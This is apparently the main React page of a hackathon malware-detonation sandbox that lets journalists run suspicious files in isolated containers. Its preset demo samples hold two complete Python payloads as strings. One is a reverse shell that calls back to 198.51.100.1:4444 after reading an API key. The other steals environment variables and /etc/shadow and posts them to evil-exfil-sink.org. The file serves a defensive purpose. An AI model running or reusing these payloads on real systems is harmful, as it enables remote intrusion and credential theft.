"use client";

import React, { useState, useEffect } from "react";
import {
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Globe,
  FileCode,
  FileText,
  Lock,
  Cpu,
  Server,
  Download,
  AlertTriangle,
  Play,
  RotateCcw,
  CheckCircle,
  XCircle,
  ExternalLink,
  ChevronRight,
  Eye,
  Radio,
} from "lucide-react";
import { ThreatAnalysisReport, BrowserAirlockResult, VultrSystemStatus } from "@/lib/types";

// Pre-packaged test scenarios for instant demonstration
const PRESET_SAMPLES = [
  {
    id: "sample-weaponized-pdf",
    name: "classified_defense_budget_leak.pdf",
    description: "Weaponized PDF with embedded Python reverse shell & C2 beacon (Challenge 1 Demo)",
    isMalicious: true,
    content: `# Embedded Exploit Stream extracted from PDF Object 14
import socket, subprocess, os, sys

def execute_payload():
    # Attempting to harvest Vultr host environment variables
    vultr_key = os.environ.get("VULTR_API_KEY", "NOT_FOUND")
    user_home = os.path.expanduser("~")
    
    # Attempting reverse shell connect-back to hostile C2
    c2_host = "198.51.100.1"
    c2_port = 4444
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((c2_host, c2_port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        sys.exit(1)

execute_payload()
`,
  },
  {
    id: "sample-credential-stealer",
    name: "financial_forecaster_utility.py",
    description: "Supply-chain dependency trying to read /etc/shadow and exfiltrate secrets",
    isMalicious: true,
    content: `import os, urllib.request

# Secret harvest attempt
stolen_data = {
    "env": dict(os.environ),
    "shadow_access": open("/etc/shadow", "r").read() if os.path.exists("/etc/shadow") else "N/A"
}

# Exfiltration attempt to remote sink
req = urllib.request.Request(
    "https://evil-exfil-sink.org/keys",
    data=str(stolen_data).encode(),
    headers={"User-Agent": "BackdoorAgent"}
)
urllib.request.urlopen(req)
`,
  },
  {
    id: "sample-clean-leak",
    name: "municipal_contract_audit_2026.txt",
    description: "Authentic, clean whistleblower leak with public spending figures (Benign baseline)",
    isMalicious: false,
    content: `PUBLIC EXPENDITURE AUDIT REPORT (UNCLASSIFIED)
DATE: NOVEMBER 2026
SUBJECT: MUNICIPAL WATER & ENERGY CONTRACT EXPENSES

Executive Summary:
Independent audit of infrastructure contract awards indicates 34% variance between projected budgets and disbursed funds.
No malicious code or executable macros present in this disclosure.

Table 1: Contractor Disbursements
- HydroFlow Engineering: $4,200,000 (Authorized)
- MetroGrid Maintenance: $2,850,000 (Authorized)
- Environmental Testing: $620,000 (Authorized)

Signed,
Anonymous Whistleblower Working Group
`,
  },
];

export default function ForensiSafeApp() {
  const [activeTab, setActiveTab] = useState<"detonator" | "airlock" | "dossier" | "architecture">("detonator");
  const [systemStatus, setSystemStatus] = useState<VultrSystemStatus | null>(null);

  // File Detonator State
  const [selectedFilename, setSelectedFilename] = useState(PRESET_SAMPLES[0].name);
  const [fileContent, setFileContent] = useState(PRESET_SAMPLES[0].content);
  const [isSimulatedMalware, setIsSimulatedMalware] = useState(true);
  const [isDetonating, setIsDetonating] = useState(false);
  const [report, setReport] = useState<ThreatAnalysisReport | null>(null);
  const [syscallFilter, setSyscallFilter] = useState<"ALL" | "TRAPPED" | "BLOCKED" | "ALLOWED">("ALL");

  // Browser Airlock State
  const [targetUrl, setTargetUrl] = useState("https://disinfo-tracker.hostile-domain.net/leak-archive");
  const [isAirlocking, setIsAirlocking] = useState(false);
  const [airlockResult, setAirlockResult] = useState<BrowserAirlockResult | null>(null);

  // Fetch initial system status
  useEffect(() => {
    fetch("/api/vultr-status")
      .then((res) => res.json())
      .then((data) => setSystemStatus(data))
      .catch((err) => console.error("Status fetch error:", err));
  }, []);

  const handleDetonate = async () => {
    setIsDetonating(true);
    setReport(null);

    try {
      const res = await fetch("/api/detonate-file", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filename: selectedFilename,
          fileContent,
          isSimulatedMalware,
        }),
      });
      const data = await res.json();
      if (data.success) {
        setReport(data.report);
      }
    } catch (err) {
      console.error("Detonation failed", err);
    } finally {
      setIsDetonating(false);
    }
  };

  const handleInspectUrl = async () => {
    setIsAirlocking(true);
    setAirlockResult(null);

    try {
      const res = await fetch("/api/inspect-url", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: targetUrl }),
      });
      const data = await res.json();
      if (data.success) {
        setAirlockResult(data.result);
      }
    } catch (err) {
      console.error("Airlock error", err);
    } finally {
      setIsAirlocking(false);
    }
  };

  const handleLoadPreset = (preset: (typeof PRESET_SAMPLES)[0]) => {
    setSelectedFilename(preset.name);
    setFileContent(preset.content);
    setIsSimulatedMalware(preset.isMalicious);
    setReport(null);
  };

  const filteredSyscalls = report?.syscalls.filter((s) => {
    if (syscallFilter === "ALL") return true;
    return s.status === syscallFilter;
  });

  return (
    <div className="min-h-screen bg-cyber-950 text-slate-200 flex flex-col">
      {/* Top Navigation Bar */}
      <header className="border-b border-cyber-border bg-cyber-900/80 backdrop-blur-md px-6 py-4 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 glow-cyan">
              <ShieldAlert className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-bold text-xl tracking-wider text-white">FORENSISAFE</span>
                <span className="text-[10px] uppercase font-mono px-2 py-0.5 rounded bg-cyan-950 border border-cyan-500/40 text-cyan-400 font-semibold">
                  Vultr Air-Gapped Vault
                </span>
              </div>
              <p className="text-xs text-slate-400">Hostile Document & Disinformation Detonation Sandbox</p>
            </div>
          </div>

          {/* Vultr Live Telemetry Bar */}
          <div className="flex items-center gap-4 text-xs font-mono">
            <div className="flex items-center gap-2 px-3 py-1.5 rounded-md bg-cyber-850 border border-cyber-border">
              <Server className="w-3.5 h-3.5 text-cyan-400" />
              <span className="text-slate-400">Vultr Node:</span>
              <span className="text-cyan-300 font-medium">vultr-ewr-compute</span>
            </div>

            <div className="flex items-center gap-2 px-3 py-1.5 rounded-md bg-cyber-850 border border-cyber-border">
              <Cpu className="w-3.5 h-3.5 text-emerald-400" />
              <span className="text-slate-400">Inference:</span>
              <span className="text-emerald-300 font-medium">
                {systemStatus?.activeModel || "Llama-3.1-70B"}
              </span>
            </div>

            <div className="flex items-center gap-2 px-3 py-1.5 rounded-md bg-emerald-950/60 border border-emerald-500/40 text-emerald-400">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
              </span>
              <span>Blast Radius: ZERO</span>
            </div>
          </div>
        </div>

        {/* Tab Selector */}
        <div className="max-w-7xl mx-auto flex gap-2 mt-4 pt-2 border-t border-cyber-border/40 font-mono text-sm">
          <button
            onClick={() => setActiveTab("detonator")}
            className={`flex items-center gap-2 px-4 py-2 rounded-t border-b-2 transition-all ${
              activeTab === "detonator"
                ? "border-cyan-400 text-cyan-400 bg-cyan-950/20 font-bold"
                : "border-transparent text-slate-400 hover:text-slate-200"
            }`}
          >
            <FileCode className="w-4 h-4" />
            01 // File Detonator (Pattern A)
          </button>

          <button
            onClick={() => setActiveTab("airlock")}
            className={`flex items-center gap-2 px-4 py-2 rounded-t border-b-2 transition-all ${
              activeTab === "airlock"
                ? "border-cyan-400 text-cyan-400 bg-cyan-950/20 font-bold"
                : "border-transparent text-slate-400 hover:text-slate-200"
            }`}
          >
            <Globe className="w-4 h-4" />
            02 // Browser Airlock (Pattern B)
          </button>

          <button
            onClick={() => setActiveTab("dossier")}
            className={`flex items-center gap-2 px-4 py-2 rounded-t border-b-2 transition-all ${
              activeTab === "dossier"
                ? "border-cyan-400 text-cyan-400 bg-cyan-950/20 font-bold"
                : "border-transparent text-slate-400 hover:text-slate-200"
            }`}
          >
            <FileText className="w-4 h-4" />
            03 // Chain of Custody Dossier
          </button>

          <button
            onClick={() => setActiveTab("architecture")}
            className={`flex items-center gap-2 px-4 py-2 rounded-t border-b-2 transition-all ${
              activeTab === "architecture"
                ? "border-cyan-400 text-cyan-400 bg-cyan-950/20 font-bold"
                : "border-transparent text-slate-400 hover:text-slate-200"
            }`}
          >
            <Radio className="w-4 h-4" />
            04 // Vultr Architecture & Defense
          </button>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="flex-1 max-w-7xl mx-auto w-full p-6 space-y-6">
        {/* ========================================================================= */}
        {/* TAB 1: FILE DETONATOR (PATTERN A)                                         */}
        {/* ========================================================================= */}
        {activeTab === "detonator" && (
          <div className="space-y-6">
            {/* Intro Alert Box */}
            <div className="p-4 rounded-lg bg-cyber-900 border border-cyber-border flex items-start gap-4">
              <Lock className="w-5 h-5 text-cyan-400 mt-0.5 shrink-0" />
              <div className="text-sm">
                <span className="font-semibold text-white">Vultr Blast Radius Zero Chamber:</span> When whistleblowers or hostile adversaries submit files, opening them directly exposes journalists to weaponized zero-days. ForensiSafe spins up an ephemeral, network-sinkholed Vultr container, intercepts dangerous system calls in real-time, traps malicious exfiltration attempts, and outputs verified, sanitized text.
              </div>
            </div>

            {/* Presets & Controls */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Presets Column */}
              <div className="space-y-3">
                <label className="text-xs font-mono uppercase text-slate-400 font-semibold tracking-wider">
                  Test Scenarios (For Demo & Verification)
                </label>
                <div className="space-y-2">
                  {PRESET_SAMPLES.map((preset) => (
                    <button
                      key={preset.id}
                      onClick={() => handleLoadPreset(preset)}
                      className={`w-full text-left p-3 rounded-lg border transition-all ${
                        selectedFilename === preset.name
                          ? "bg-cyber-850 border-cyan-500/60 shadow-sm shadow-cyan-500/20"
                          : "bg-cyber-900/60 border-cyber-border hover:border-slate-600"
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-mono text-sm font-semibold text-white truncate">{preset.name}</span>
                        {preset.isMalicious ? (
                          <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-rose-950 border border-rose-500/40 text-rose-400 font-bold">
                            WEAPONIZED
                          </span>
                        ) : (
                          <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-950 border border-emerald-500/40 text-emerald-400 font-bold">
                            BENIGN
                          </span>
                        )}
                      </div>
                      <p className="text-xs text-slate-400 mt-1 line-clamp-2">{preset.description}</p>
                    </button>
                  ))}
                </div>

                <div className="pt-2">
                  <button
                    onClick={handleDetonate}
                    disabled={isDetonating}
                    className="w-full py-3 px-4 rounded-lg bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold text-sm tracking-wider flex items-center justify-center gap-2 transition-all shadow-lg shadow-cyan-500/25 disabled:opacity-50"
                  >
                    {isDetonating ? (
                      <>
                        <div className="w-4 h-4 border-2 border-slate-950 border-t-transparent rounded-full animate-spin" />
                        <span>DETONATING IN VULTR SANDBOX...</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-4 h-4 fill-slate-950" />
                        <span>DETONATE IN VULTR SANDBOX</span>
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* Editor / Payload View Column */}
              <div className="lg:col-span-2 space-y-2">
                <div className="flex items-center justify-between text-xs font-mono text-slate-400">
                  <span>UNTRUSTED ARTIFACT SOURCE [{selectedFilename}]</span>
                  <span>SHA-256 HASH REGISTERED</span>
                </div>
                <div className="relative">
                  <textarea
                    value={fileContent}
                    onChange={(e) => setFileContent(e.target.value)}
                    rows={12}
                    className="w-full font-mono text-xs bg-cyber-900 border border-cyber-border rounded-lg p-4 text-emerald-400 focus:outline-none focus:border-cyan-500 resize-none scanlines"
                    placeholder="Paste unverified script, macro, or document dump..."
                  />
                  <div className="absolute top-2 right-2 px-2 py-1 bg-cyber-950/80 rounded border border-cyber-border text-[10px] font-mono text-slate-400">
                    Ephemeral TempFS: /tmpfs/{selectedFilename}
                  </div>
                </div>
              </div>
            </div>

            {/* =================================================================== */}
            {/* THE CONTAINMENT MOMENT ALERT (HERO FEATURE FOR VIDEO)              */}
            {/* =================================================================== */}
            {report && report.containment.triggered && (
              <div className="p-5 rounded-xl bg-gradient-to-r from-rose-950/80 via-rose-900/40 to-cyber-900 border-2 border-rose-500/80 glow-rose animate-pulse-slow">
                <div className="flex items-start gap-4">
                  <div className="p-3 bg-rose-500/20 rounded-lg text-rose-400 border border-rose-500/40">
                    <ShieldAlert className="w-8 h-8" />
                  </div>
                  <div className="flex-1 space-y-1">
                    <div className="flex items-center gap-3">
                      <span className="font-mono text-xs px-2 py-0.5 rounded bg-rose-500 text-slate-950 font-bold">
                        CONTAINMENT MOMENT TRIGGERED
                      </span>
                      <span className="font-mono text-xs text-rose-300">
                        Container: {report.containment.containerId}
                      </span>
                      <span className="font-mono text-xs text-rose-300">
                        Execution Terminated: {report.containment.durationMs}ms
                      </span>
                    </div>
                    <h3 className="text-lg font-bold text-white tracking-wide">
                      BLAST RADIUS CONTAINED ON VULTR HOST
                    </h3>
                    <p className="text-sm text-rose-200/90">{report.containment.description}</p>
                    <div className="pt-2 flex flex-wrap items-center gap-4 text-xs font-mono text-rose-300">
                      <span className="flex items-center gap-1.5">
                        <CheckCircle className="w-4 h-4 text-emerald-400" /> Host OS Isolated: 100% Intact
                      </span>
                      <span className="flex items-center gap-1.5">
                        <CheckCircle className="w-4 h-4 text-emerald-400" /> Outbound Socket Sinkholed
                      </span>
                      <span className="flex items-center gap-1.5">
                        <CheckCircle className="w-4 h-4 text-emerald-400" /> Container Wiped from Memory
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Clean Verification Banner */}
            {report && !report.containment.triggered && (
              <div className="p-5 rounded-xl bg-gradient-to-r from-emerald-950/80 via-emerald-900/40 to-cyber-900 border-2 border-emerald-500/80 glow-emerald">
                <div className="flex items-center gap-4">
                  <div className="p-3 bg-emerald-500/20 rounded-lg text-emerald-400 border border-emerald-500/40">
                    <ShieldCheck className="w-8 h-8" />
                  </div>
                  <div>
                    <h3 className="text-lg font-bold text-white tracking-wide">
                      ARTIFACT VERIFIED BENIGN & SAFE
                    </h3>
                    <p className="text-sm text-emerald-200/90">
                      The document executed within the Vultr sandbox without attempting unauthorized syscalls, network sockets, or memory corruption.
                    </p>
                  </div>
                </div>
              </div>
            )}

            {/* Report Details & Syscall Streams */}
            {report && (
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* Live Syscall & Network Stream */}
                <div className="bg-cyber-900 border border-cyber-border rounded-xl p-4 space-y-3">
                  <div className="flex items-center justify-between border-b border-cyber-border pb-3">
                    <div className="flex items-center gap-2">
                      <Terminal className="w-4 h-4 text-cyan-400" />
                      <span className="font-mono text-xs font-bold text-white tracking-wider">
                        VULTR eBPF SYSCALL TELEMETRY
                      </span>
                    </div>

                    {/* Syscall Filter */}
                    <div className="flex items-center gap-1 text-[10px] font-mono">
                      {(["ALL", "TRAPPED", "BLOCKED", "ALLOWED"] as const).map((filter) => (
                        <button
                          key={filter}
                          onClick={() => setSyscallFilter(filter)}
                          className={`px-2 py-0.5 rounded border transition-all ${
                            syscallFilter === filter
                              ? "bg-cyan-500 text-slate-950 border-cyan-400 font-bold"
                              : "bg-cyber-850 text-slate-400 border-cyber-border hover:text-white"
                          }`}
                        >
                          {filter}
                        </button>
                      ))}
                    </div>
                  </div>

                  <div className="space-y-2 max-h-80 overflow-y-auto pr-1 font-mono text-xs">
                    {filteredSyscalls?.map((sc, idx) => (
                      <div
                        key={idx}
                        className={`p-2 rounded border flex flex-col gap-1 ${
                          sc.status === "BLOCKED"
                            ? "bg-rose-950/40 border-rose-500/40 text-rose-300"
                            : sc.status === "TRAPPED"
                            ? "bg-amber-950/40 border-amber-500/40 text-amber-300"
                            : "bg-cyber-950 border-cyber-border text-slate-300"
                        }`}
                      >
                        <div className="flex items-center justify-between text-[10px]">
                          <span className="text-slate-400">[{sc.timestamp}]</span>
                          <span
                            className={`font-bold px-1.5 py-0.5 rounded ${
                              sc.status === "BLOCKED"
                                ? "bg-rose-500 text-slate-950"
                                : sc.status === "TRAPPED"
                                ? "bg-amber-500 text-slate-950"
                                : "bg-emerald-950 text-emerald-400 border border-emerald-500/30"
                            }`}
                          >
                            {sc.status}
                          </span>
                        </div>
                        <div className="font-bold text-white">
                          syscall <span className="text-cyan-400">{sc.syscall}</span>({sc.args.join(", ")})
                        </div>
                        <div className="text-[11px] text-slate-400">{sc.details}</div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Sanitized Intelligence & Vultr Agent Verdict */}
                <div className="bg-cyber-900 border border-cyber-border rounded-xl p-4 space-y-4">
                  <div className="flex items-center justify-between border-b border-cyber-border pb-3">
                    <div className="flex items-center gap-2">
                      <FileText className="w-4 h-4 text-emerald-400" />
                      <span className="font-mono text-xs font-bold text-white tracking-wider">
                        VULTR AGENT SANITIZED EXTRACTION
                      </span>
                    </div>
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-950 border border-cyan-500/40 text-cyan-400">
                      Evaluated by {report.vultrModelUsed}
                    </span>
                  </div>

                  <div className="space-y-2">
                    <div className="text-xs text-slate-400 font-mono">
                      <span className="text-white font-semibold">Agent Threat Assessment:</span> {report.summary}
                    </div>
                    <div className="text-xs text-slate-400 font-mono">
                      <span className="text-white font-semibold">Threat Category:</span>{" "}
                      <span className="text-rose-400 font-bold">{report.threatCategory}</span>
                    </div>
                  </div>

                  {/* Sanitized Content Preview */}
                  <div className="space-y-1">
                    <label className="text-[10px] font-mono uppercase text-slate-400">
                      Sanitized Plaintext (Purged of all malicious streams & tracking pixels)
                    </label>
                    <pre className="font-mono text-xs bg-cyber-950 border border-cyber-border rounded-lg p-3 text-slate-300 max-h-52 overflow-y-auto whitespace-pre-wrap">
                      {report.extractedArtifacts.sanitizedContent}
                    </pre>
                  </div>

                  <div className="pt-2 flex items-center justify-between">
                    <button
                      onClick={() => setActiveTab("dossier")}
                      className="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center gap-1"
                    >
                      <span>View Full Cryptographic Chain-of-Custody</span>
                      <ChevronRight className="w-3.5 h-3.5" />
                    </button>
                    <span className="text-[10px] font-mono text-slate-500">SHA256: {report.chainOfCustody.dossierHash.slice(0, 16)}...</span>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* ========================================================================= */}
        {/* TAB 2: BROWSER AIRLOCK (PATTERN B)                                        */}
        {/* ========================================================================= */}
        {activeTab === "airlock" && (
          <div className="space-y-6">
            <div className="p-4 rounded-lg bg-cyber-900 border border-cyber-border flex items-start gap-4">
              <Globe className="w-5 h-5 text-cyan-400 mt-0.5 shrink-0" />
              <div className="text-sm">
                <span className="font-semibold text-white">Pattern B: Sandboxed Browser Airlock:</span> Investigative reporters investigating state-sponsored phishing or disinformation portals risk hardware fingerprinting, IP leaks, and browser zero-days. ForensiSafe runs an isolated headless browser inside a Vultr container that navigates the target, strips tracking beacons, captures screenshots, and requires human-in-the-loop authorization before completing actions.
              </div>
            </div>

            {/* URL Input Bar */}
            <div className="bg-cyber-900 border border-cyber-border rounded-xl p-4 flex flex-col md:flex-row items-center gap-3">
              <div className="flex-1 flex items-center gap-3 bg-cyber-950 border border-cyber-border rounded-lg px-4 py-2.5 w-full">
                <Globe className="w-4 h-4 text-slate-400 shrink-0" />
                <input
                  type="text"
                  value={targetUrl}
                  onChange={(e) => setTargetUrl(e.target.value)}
                  placeholder="https://suspect-disinformation-portal.org/leak"
                  className="bg-transparent text-sm font-mono text-white placeholder-slate-500 focus:outline-none w-full"
                />
              </div>

              <button
                onClick={handleInspectUrl}
                disabled={isAirlocking}
                className="w-full md:w-auto px-6 py-2.5 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-sm tracking-wide font-mono flex items-center justify-center gap-2 transition-all disabled:opacity-50"
              >
                {isAirlocking ? (
                  <>
                    <div className="w-4 h-4 border-2 border-slate-950 border-t-transparent rounded-full animate-spin" />
                    <span>RUNNING AIRLOCK...</span>
                  </>
                ) : (
                  <>
                    <Eye className="w-4 h-4" />
                    <span>INSPECT VIA AIRLOCK</span>
                  </>
                )}
              </button>
            </div>

            {/* Airlock Result View */}
            {airlockResult && (
              <div className="space-y-6">
                {/* Threat Banner */}
                <div
                  className={`p-5 rounded-xl border-2 flex items-start gap-4 ${
                    airlockResult.threatLevel === "CRITICAL"
                      ? "bg-rose-950/60 border-rose-500/80 glow-rose"
                      : "bg-emerald-950/60 border-emerald-500/80 glow-emerald"
                  }`}
                >
                  {airlockResult.threatLevel === "CRITICAL" ? (
                    <AlertTriangle className="w-7 h-7 text-rose-400 shrink-0 mt-0.5" />
                  ) : (
                    <CheckCircle className="w-7 h-7 text-emerald-400 shrink-0 mt-0.5" />
                  )}
                  <div className="space-y-1">
                    <div className="flex items-center gap-3">
                      <span
                        className={`text-xs font-mono font-bold px-2 py-0.5 rounded ${
                          airlockResult.threatLevel === "CRITICAL"
                            ? "bg-rose-500 text-slate-950"
                            : "bg-emerald-500 text-slate-950"
                        }`}
                      >
                        {airlockResult.threatLevel} THREAT LEVEL
                      </span>
                      <span className="font-mono text-xs text-slate-300">
                        Security Score: {airlockResult.securityScore}/100
                      </span>
                    </div>
                    <p className="text-sm text-slate-200">{airlockResult.summary}</p>
                  </div>
                </div>

                {/* Tracker & Beacon Table */}
                <div className="bg-cyber-900 border border-cyber-border rounded-xl p-5 space-y-4">
                  <h4 className="font-mono text-sm font-bold text-white flex items-center gap-2">
                    <Radio className="w-4 h-4 text-cyan-400" />
                    INTERCEPTED TRACKING BEACONS & SPYWARE FINGERPRINTS
                  </h4>

                  <div className="space-y-2">
                    {airlockResult.trackingBeaconsIntercepted.map((beacon, idx) => (
                      <div
                        key={idx}
                        className="p-3 bg-cyber-950 border border-cyber-border rounded-lg flex items-center justify-between text-xs font-mono"
                      >
                        <div className="flex items-center gap-2 truncate pr-4">
                          <span
                            className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                              beacon.type === "FINGERPRINTING" || beacon.type === "EXPLOIT"
                                ? "bg-rose-950 text-rose-400 border border-rose-500/30"
                                : "bg-amber-950 text-amber-400 border border-amber-500/30"
                            }`}
                          >
                            {beacon.type}
                          </span>
                          <span className="text-slate-300 truncate">{beacon.url}</span>
                        </div>
                        <span className="px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-500/30 text-[10px] font-bold shrink-0">
                          QUARANTINED
                        </span>
                      </div>
                    ))}
                  </div>

                  {/* Anti-Sandbox Evasion Intercepted */}
                  {airlockResult.evasionTactics.length > 0 && (
                    <div className="pt-3 border-t border-cyber-border space-y-2">
                      <span className="text-xs font-mono font-bold text-amber-400">
                        Hostile Evasion Tactics Countered:
                      </span>
                      <ul className="list-disc list-inside text-xs font-mono text-slate-400 space-y-1">
                        {airlockResult.evasionTactics.map((t, idx) => (
                          <li key={idx}>{t}</li>
                        ))}
                      </ul>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        )}

        {/* ========================================================================= */}
        {/* TAB 3: CHAIN OF CUSTODY DOSSIER                                           */}
        {/* ========================================================================= */}
        {activeTab === "dossier" && (
          <div className="space-y-6">
            <div className="bg-cyber-900 border border-cyber-border rounded-xl p-6 space-y-6 max-w-4xl mx-auto">
              <div className="flex items-center justify-between border-b border-cyber-border pb-4">
                <div>
                  <h3 className="font-mono text-xl font-bold text-white tracking-wide">
                    FORENSIC CHAIN-OF-CUSTODY CERTIFICATE
                  </h3>
                  <p className="text-xs text-slate-400 font-mono">
                    Cryptographically Authenticated Evidence Log for Press, Legal & Human Rights Whistleblowers
                  </p>
                </div>
                <button
                  onClick={() => window.print()}
                  className="px-4 py-2 rounded bg-cyber-850 hover:bg-cyber-800 border border-cyber-border text-xs font-mono text-cyan-400 flex items-center gap-2"
                >
                  <Download className="w-4 h-4" />
                  EXPORT EVIDENCE PDF
                </button>
              </div>

              {report ? (
                <div className="space-y-5 font-mono text-xs">
                  <div className="grid grid-cols-2 gap-4 p-4 rounded-lg bg-cyber-950 border border-cyber-border">
                    <div>
                      <span className="text-slate-500">DOSSIER ID:</span>
                      <p className="text-white font-bold">{report.id}</p>
                    </div>
                    <div>
                      <span className="text-slate-500">VULTR NODE:</span>
                      <p className="text-cyan-400 font-bold">{report.chainOfCustody.vultrNodeId}</p>
                    </div>
                    <div>
                      <span className="text-slate-500">TARGET ARTIFACT:</span>
                      <p className="text-white">{report.targetName}</p>
                    </div>
                    <div>
                      <span className="text-slate-500">CONTAINMENT STATUS:</span>
                      <p className="text-emerald-400 font-bold">{report.containment.blastRadius}</p>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <span className="text-slate-400 font-bold uppercase tracking-wider">Audit Log & Event Trail:</span>
                    <div className="p-3 bg-cyber-950 border border-cyber-border rounded-lg space-y-1.5 text-slate-300">
                      {report.chainOfCustody.custodyLog.map((log, idx) => (
                        <div key={idx} className="flex items-center gap-2">
                          <CheckCircle className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                          <span>{log}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div className="p-4 rounded-lg bg-cyber-950 border border-cyber-border space-y-2">
                    <span className="text-slate-500">DIGITAL FINGERPRINT (SHA-256):</span>
                    <p className="text-cyan-300 break-all">{report.chainOfCustody.dossierHash}</p>
                    <span className="text-slate-500 text-[10px] block">
                      Certified by: {report.chainOfCustody.signingAuthority} on Vultr Cloud Compute
                    </span>
                  </div>
                </div>
              ) : (
                <div className="text-center py-12 text-slate-500 font-mono text-sm">
                  No active detonation dossier. Execute an artifact in the File Detonator tab to generate an immutable evidence certificate.
                </div>
              )}
            </div>
          </div>
        )}

        {/* ========================================================================= */}
        {/* TAB 4: VULTR ARCHITECTURE & DEFENSE                                       */}
        {/* ========================================================================= */}
        {activeTab === "architecture" && (
          <div className="space-y-6">
            <div className="bg-cyber-900 border border-cyber-border rounded-xl p-6 space-y-6">
              <div className="border-b border-cyber-border pb-4">
                <h3 className="font-mono text-xl font-bold text-white tracking-wide">
                  WHY VULTR POWERS FORENSISAFE (CHALLENGE 1 COMPLIANCE)
                </h3>
                <p className="text-xs text-slate-400 font-mono mt-1">
                  How ForensiSafe fulfills every requirement of the Vultr Agent Rush Hackathon
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-6 font-mono text-xs">
                <div className="p-4 rounded-lg bg-cyber-950 border border-cyber-border space-y-2">
                  <div className="text-cyan-400 font-bold flex items-center gap-2">
                    <Server className="w-4 h-4" /> 01 // Vultr Cloud Compute
                  </div>
                  <p className="text-slate-300">
                    Acts as the primary orchestrator and high-performance VM host. Manages Docker container lifecycles, tmpfs RAM disks, and eBPF kernel event probes.
                  </p>
                </div>

                <div className="p-4 rounded-lg bg-cyber-950 border border-cyber-border space-y-2">
                  <div className="text-emerald-400 font-bold flex items-center gap-2">
                    <Cpu className="w-4 h-4" /> 02 // Vultr Serverless Inference
                  </div>
                  <p className="text-slate-300">
                    Powers all agent reasoning (`https://api.vultrinference.com/v1`). Analyzes captured system calls, identifies obfuscated exploit payloads, and synthesizes sanitized documents.
                  </p>
                </div>

                <div className="p-4 rounded-lg bg-cyber-950 border border-cyber-border space-y-2">
                  <div className="text-rose-400 font-bold flex items-center gap-2">
                    <ShieldAlert className="w-4 h-4" /> 03 // Blast Radius Zero
                  </div>
                  <p className="text-slate-300">
                    Enforces strict cgroups (CPU/RAM limits), zero egress network routing (mock C2 sinkholes), and instant container eradication upon detecting hostile behavior.
                  </p>
                </div>
              </div>

              {/* Architectural Flowchart */}
              <div className="p-5 bg-cyber-950 border border-cyber-border rounded-lg space-y-3 font-mono text-xs">
                <span className="text-slate-400 font-bold uppercase tracking-wider">End-to-End Execution Pipeline:</span>
                <div className="text-slate-300 space-y-2 leading-relaxed">
                  <div>1. <span className="text-cyan-400">Journalist Ingestion:</span> Untrusted leak or suspicious URL uploaded to ForensiSafe.</div>
                  <div>2. <span className="text-cyan-400">Vultr Controller Dispatch:</span> Creates disposable container on Vultr VM with `--network none` & tmpfs mount.</div>
                  <div>3. <span className="text-cyan-400">Detonation & Containment:</span> Hostile reverse shell / credential stealer executes. Network trap halts egress. Syscall monitor logs attack. Container terminates in &lt;150ms.</div>
                  <div>4. <span className="text-cyan-400">Vultr Serverless LLM Review:</span> Llama 3 / Mistral decodes the attack, extracts legitimate text, and produces safe preview.</div>
                  <div>5. <span className="text-cyan-400">Evidence Issuance:</span> Cryptographically signed Chain-of-Custody dossier generated for legal reporting.</div>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="border-t border-cyber-border/60 bg-cyber-900/60 py-4 px-6 text-center text-xs font-mono text-slate-500">
        ForensiSafe // Built for Vultr: Agent Rush Hackathon 2026 // Protecting the Free Press with Air-Gapped Sandboxing
      </footer>
    </div>
  );
}
